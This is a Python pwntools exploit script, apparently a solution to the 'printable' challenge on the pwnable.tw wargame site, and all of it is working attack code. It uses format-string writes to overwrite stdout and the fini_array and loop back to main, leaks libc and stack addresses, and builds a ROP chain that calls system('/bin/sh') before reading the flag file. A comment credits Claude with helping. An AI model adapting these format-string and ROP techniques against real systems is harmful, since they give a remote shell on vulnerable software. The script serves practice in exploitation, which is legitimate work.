#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
A = lambda len=1, c=b'A': c * len
z = lambda len=1, c=b'\0': c * len

e = context.binary = ELF('./printable_patched', checksec=False)
libc = ELF('./libc_64.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
# b *main+126
# b *_dl_fini+777
b *printf+148
continue
'''

def conn():
    if args.LOCAL:
        p = process([e.path], stdin=PTY, stdout=PTY, stderr=PTY)
        sleep(0.25)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10307
        return remote(host, port)

# Claude is so good
def fmtstr_byte(offset, writes, written=0):
        # expand to (byte_val, addr) pairs, sort by byte_val
        pairs = sorted(
            [(( v >> (8*i)) & 0xff, addr + i)
            for addr, v in writes.items()
            for i in range((v.bit_length() + 7) // 8 or 1)],
            key=lambda x: x[0]
        )

        fmt = ''
        addrs = []
        for i, (byte, addr) in enumerate(pairs):
            diff = (byte - written) % 256
            fmt += (f'%{diff}c' if diff else '') + f'%{offset + i}$hhn'
            written = byte
            addrs.append(addr)

        fmt = fmt.ljust((len(fmt) + 7) & ~7, 'X')  # align to 8 bytes
        return fmt.encode() + b''.join(pack(a) for a in addrs)

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)
    p = conn()

    bss = 0x601000
    stdout_bss = bss + 0x20
    fini_array = 0x600db8
    main_86 = 0x400925 # <main+86>
    stderr = 0x4540

    '''
    0x248 = fini_array - bss
    0x40 0x0925
    0x45 0x40

    write:
    0x4540 -> stdout_bss
    printf() always use 0x601020 (stdout@@GLIBC_2.2.5)

    0x400925 -> bss, ret2main when exit()
    '''
    print("Overwriting stdout and l_addr")
    k = 13
    pl = f'%{0x40}c%{k}$hn'
    pl += f'%{k+1}$hhn'
    pl += f'%{0x5}c%{k+2}$hhn'
    pl += f'%{bss - fini_array - 0x45}c%42$hn'
    pl += f'%{0x925 - 0x248}c%{k+3}$hn'
    pl = pl.encode().ljust(56, b'A')
    pl += flat(bss + 2, stdout_bss, stdout_bss + 1, bss)
    sa(p, b'Input :', pl)

    sleep(0.25)

    print("Leaking libc and stack")
    pl = f'%{0x25}c%23$hhn'
    pl += f'libc-%32$p stack-%35$p'
    pl = pl.encode().ljust(0x50, b'\0')

    # Overwrite last byte of printf() return address
    last_byte = 0xe0
    pl += p8(last_byte)
    s(p, pl)

    r = p.recvrepeat(timeout=1)
    if len(r) < 1 or b'Segmentation fault' in r:
        print("Fail attempt, sigsegv")
        p.close()
        sleep(0.5)
        continue
    
    idx = r.index(b'libc-') + 5
    libc.address = leak_hex(r[idx : idx + 14], 0x39ff8)
    lg("libc base", libc.address)

    idx = r.index(b'stack-') + 6
    stack = leak_hex(r[idx : idx + 14])
    lg("stack", stack)

    # Stack check to see if last byte overwrite was correct
    if stack & 0xff != (last_byte + 0xb0) & 0xff:
        print("Fail attempt, last byte overwrite was wrong")
        p.close()
        continue

    print("Last byte overwrite was correct, continue")

    sleep(0.25)

    add_rsp_0x80_ret = libc.address + 0x000000000006b4b8 # add rsp, 0x80 ; ret
    pop_rdi_ret = libc.address + 0x0000000000021102, # pop rdi ; ret
    ret = 0x4009c4

    print("ROP byte by byte")

    sleep(0.25)

    for i in range(3):
        writes = {
            stack - 0x1b0: main_86,
            stack - 0x1a8 + (i * 2): (add_rsp_0x80_ret >> (8 * i * 2)) & 0xffff
        }
        pl = fmtstr_byte(20, writes)
        s(p, pl)

        sleep(0.25)

    writes = {
        stack - 0x1b0: ret,
    }
    pl = fmtstr_byte(18, writes).ljust(0x50, b'\0')
    pl += flat(
        pop_rdi_ret, # rsp + 0x80
        binsh(libc),
        libc.symbols['system']
    )
    s(p, pl)

    rr(p, 1)
    print("Success, calling system()")

    print("Write flags to stderr")
    sl(p, b'cat /home/printable/printable_fl4g >&2')
    print(ra(p, 2).decode())

    p.close()
    break